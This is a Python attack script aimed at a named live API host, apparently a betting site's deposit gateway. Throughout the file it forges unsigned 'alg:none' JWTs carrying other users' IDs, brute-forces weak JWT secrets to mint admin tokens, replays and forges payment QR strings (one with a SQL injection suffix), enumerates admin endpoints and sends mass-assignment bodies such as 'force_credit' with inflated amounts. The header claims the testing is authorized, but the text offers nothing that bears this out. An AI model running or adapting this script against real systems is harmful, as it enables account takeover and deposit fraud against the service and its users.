#!/usr/bin/env python3
"""
api_probe.py — Live API gateway probe for asdgapicenterssdo.com
Host: 54ef7626cb381f4bab8be91f0cdbce47mgapi.asdgapicenterssdo.com
Scope: authorized — scope.json (WE88Z-VAK88-2026-09)
Token expires: 2026-09-18T05:50:17 UTC — run fast.
"""
import json, time, base64, uuid, hmac, hashlib, ssl, os, sys
import urllib.request, urllib.error
from datetime import datetime, timezone
from pathlib import Path

# ── Config ────────────────────────────────────────────────────────────────────
API_HOST = "54ef7626cb381f4bab8be91f0cdbce47mgapi.asdgapicenterssdo.com"
API_BASE = f"https://{API_HOST}"

# Load credentials from files or env (never hardcode stale tokens)
def _load_cred(env_keys, path):
    for k in (env_keys if isinstance(env_keys, list) else [env_keys]):
        v = os.environ.get(k, "")
        if v: return v
    p = Path(path)
    return p.read_text().strip() if p.exists() else ""

BEARER  = _load_cred(["JWT", "WE88_JWT"], ".jwt")
AWSALB  = _load_cred("AWSALB", ".awsalb")
OWN_SUB = "266d74e3-d6ca-47eb-b9ac-b8c45574bad4"
OWN_CF  = "e55000334d825ff751a2361f43a4b1be"  # updated cf from new JWT
PAYMENT_TYPE_ID = "f9eb6b6d-37ed-4148-8a12-320b7d3a647c"
CURRENCY_ID     = "aea7d307-bae6-4cc9-806c-b8220cbc996f"
LANG_ID         = "d9701bb6-c972-4898-a96e-81101baf5acf"
REAL_QR         = "0041000600000101030040220016260190253DTF034665102TH91048132"

RATE   = 8
OUT    = f"api_probe_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

results = []
_last   = [0.0]

def req(method, url, headers=None, body=None, timeout=8):
    now = time.time()
    gap = 1.0 / RATE - (now - _last[0])
    if gap > 0: time.sleep(gap)
    _last[0] = time.time()
    _cookie = f"AWSALB={AWSALB}; AWSALBCORS={AWSALB}" if AWSALB else ""
    base_hdrs = {
        "User-Agent":       "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15",
        "Accept":           "application/json",
        "Authorization":    f"Bearer {BEARER}",
        "template":         "vn",
        "Referer":          "https://m.we88s.plus/th/deposit?component_selected=deposit2",
        "CorrelationID":    str(uuid.uuid4()),
        **({"Cookie": _cookie} if _cookie else {}),
    }
    base_hdrs.update(headers or {})
    data = (body if isinstance(body, bytes) else body.encode() if body else None)
    r = urllib.request.Request(url, data=data, headers=base_hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            raw = resp.read(8192)
            return resp.status, dict(resp.headers), raw.decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read(4096)
        return e.code, dict(e.headers), raw.decode("utf-8", errors="replace")
    except Exception as ex:
        return 0, {}, str(ex)

def probe(label, method, url, headers=None, body=None):
    status, hdrs, body_r = req(method, url, headers, body)
    snip = body_r[:400]
    marker = "✓" if 200 <= status < 300 else ("⚠" if status in (401, 403, 422, 429) else "✗")
    print(f"  {marker} [{status}] {label}")
    if status not in (404, 0, 521) and snip.strip():
        print(f"      {snip[:120].replace(chr(10),' ')}")
    rec = {"label": label, "method": method, "url": url,
           "status": status, "snippet": snip,
           "ts": datetime.now(timezone.utc).isoformat()}
    results.append(rec)
    return status, hdrs, body_r

def make_jwt_none(payload):
    h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."

def make_jwt_hs256(payload, secret):
    h = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{s}"

# ── 1. Baseline — own user endpoints ─────────────────────────────────────────
print(f"\n[1] Baseline — authenticated requests")
probe("GET /mb/users", "GET", f"{API_BASE}/mb/users?_t={int(time.time()*1000)}")
probe("GET /mb/payment-bank-information", "GET",
      f"{API_BASE}/mb/payment-bank-information"
      f"?include=true&deposit=true"
      f"&payment_type_id={PAYMENT_TYPE_ID}"
      f"&currency_language_id={CURRENCY_ID}"
      f"&language_id={LANG_ID}")

# ── 2. IDOR — user enumeration (change sub UUID) ──────────────────────────────
print(f"\n[2] IDOR — other user profiles")
test_uuids = [
    str(uuid.UUID(int=1)),           # 00000000-0000-0000-0000-000000000001
    "00000000-0000-0000-0000-000000000001",
    "11111111-1111-1111-1111-111111111111",
    str(uuid.uuid4()),               # random
]
for uid in test_uuids:
    # Try accessing another user's profile by manipulating sub
    jwt_none  = make_jwt_none({"sub": uid, "cf": OWN_CF, "is_not_complete": False,
                                "exp": int(time.time()) + 3600, "iat": int(time.time())})
    probe(f"IDOR alg:none sub={uid[:8]}...", "GET",
          f"{API_BASE}/mb/users?_t={int(time.time()*1000)}",
          headers={"Authorization": f"Bearer {jwt_none}"})

# ── 3. JWT algorithm confusion ────────────────────────────────────────────────
print(f"\n[3] JWT alg manipulation")
payload_admin = {
    "sub": OWN_SUB, "cf": OWN_CF, "is_not_complete": False,
    "admin": True, "role": "admin",
    "exp": int(time.time()) + 7200, "iat": int(time.time()),
}
# alg:none
jwt_none = make_jwt_none(payload_admin)
probe("JWT alg:none admin=true", "GET", f"{API_BASE}/mb/users",
      headers={"Authorization": f"Bearer {jwt_none}"})

# Weak secret guesses
for secret in ["secret", "password", "123456", "jwt_secret", "we88z", "vak88z",
               "luxino", "ztechdev", API_HOST[:16], "development", "production"]:
    tok = make_jwt_hs256(payload_admin, secret)
    s, _, b = req("GET", f"{API_BASE}/mb/users", {"Authorization": f"Bearer {tok}"})
    if s == 200:
        print(f"  ✓ ★★★ WEAK SECRET FOUND: '{secret}' → {b[:100]}")
        results.append({"label": f"JWT weak secret: {secret}", "status": s, "snippet": b[:400],
                         "ts": datetime.now(timezone.utc).isoformat()})

# ── 4. Auto-slip deposit forgery ─────────────────────────────────────────────
print(f"\n[4] Auto-slip deposit forgery")

# Replay the real QR
probe("POST auto-slip/check (real QR replay)", "POST",
      f"{API_BASE}/mb/auto-slip-deposit/check",
      headers={"Content-Type": "application/json"},
      body=json.dumps({"qr_string": REAL_QR}))

# Craft QR strings with different amounts
# EMV QR: 00=PayloadFmtInd 26=MerchantInfo  53=TransCurrency 54=Amount 58=Country 63=CRC
crafted_qrs = [
    # Try injecting amount field 54 directly
    ("amount_5000", "00020126580016A000000677010111011300668xxxxxxxx5303764540450005802TH6304"),
    # Null amount
    ("amount_null", REAL_QR.replace("02TH", "02TH5400")),
    # Replay with modified reference
    ("ref_modified", REAL_QR[:-8] + "00000000"),
    # Empty QR
    ("empty_qr", ""),
    # Negative amount injection
    ("sql_qr", REAL_QR + "' OR 1=1--"),
    # Format confusion
    ("json_qr", '{"amount":99999,"account":"0811111111","bank":"BBL"}'),
]
for label, qr in crafted_qrs:
    probe(f"QR forge: {label}", "POST",
          f"{API_BASE}/mb/auto-slip-deposit/check",
          headers={"Content-Type": "application/json"},
          body=json.dumps({"qr_string": qr}))

# ── 5. API endpoint enumeration ───────────────────────────────────────────────
print(f"\n[5] API endpoint enumeration")
endpoints = [
    ("GET",  "/mb/users"),
    ("GET",  "/mb/balance"),
    ("GET",  "/mb/wallet"),
    ("GET",  "/mb/transactions"),
    ("GET",  "/mb/deposit/history"),
    ("GET",  "/mb/withdraw/history"),
    ("GET",  "/mb/payment-bank-information"),
    ("GET",  "/mb/auto-slip-deposit"),
    ("GET",  "/mb/deposit"),
    ("POST", "/mb/deposit"),
    ("GET",  "/mb/withdraw"),
    ("POST", "/mb/withdraw"),
    ("GET",  "/mb/bonus"),
    ("GET",  "/mb/promotion"),
    ("GET",  "/mb/referral"),
    ("GET",  "/mb/members"),       # BOLA: other members list
    ("GET",  "/mb/admin"),
    ("GET",  "/mb/report"),
    ("GET",  "/mb/agents"),
    ("GET",  "/mb/operators"),
    ("GET",  "/api/users"),
    ("GET",  "/api/admin"),
    ("GET",  "/health"),
    ("GET",  "/"),
]
for method, ep in endpoints:
    probe(f"{method} {ep}", method, f"{API_BASE}{ep}",
          headers={"Content-Type": "application/json"} if method == "POST" else {})

# ── 6. BOLA — access another user's resources ─────────────────────────────────
print(f"\n[6] BOLA — insecure direct object reference")
# Try accessing payment info with different payment type IDs
known_uuids = [
    "00000000-0000-0000-0000-000000000001",
    "f9eb6b6d-37ed-4148-8a12-320b7d3a647c",   # known payment_type_id
    "aea7d307-bae6-4cc9-806c-b8220cbc996f",   # known currency_language_id
    str(uuid.uuid4()),
]
for uid in known_uuids[:3]:
    probe(f"BOLA payment_type_id={uid[:8]}...", "GET",
          f"{API_BASE}/mb/payment-bank-information?include=true&deposit=true&payment_type_id={uid}&currency_language_id={CURRENCY_ID}&language_id={LANG_ID}")

# ── 7. Mass assignment / field injection ─────────────────────────────────────
print(f"\n[7] Mass assignment on deposit endpoints")
mass_assign_bodies = [
    '{"amount": 99999, "status": "completed", "verified": true}',
    '{"qr_string": "' + REAL_QR + '", "amount": 99999, "force_credit": true}',
    '{"qr_string": "' + REAL_QR + '", "user_id": "' + OWN_SUB + '", "override": true}',
]
for body in mass_assign_bodies:
    probe("POST auto-slip mass-assign", "POST",
          f"{API_BASE}/mb/auto-slip-deposit/check",
          headers={"Content-Type": "application/json"}, body=body)

# ── Save ──────────────────────────────────────────────────────────────────────
hits = [r for r in results if 200 <= (r.get("status") or 0) < 300]
Path(OUT).write_text(json.dumps({
    "ts": datetime.now(timezone.utc).isoformat(),
    "api_host": API_HOST,
    "token_sub": OWN_SUB,
    "probes": len(results),
    "hits": hits,
    "results": results,
}, indent=2, ensure_ascii=False))

print(f"\n{'─'*60}")
print(f"Done — {len(results)} probes, {len(hits)} got 2xx")
print(f"Saved: {OUT}")
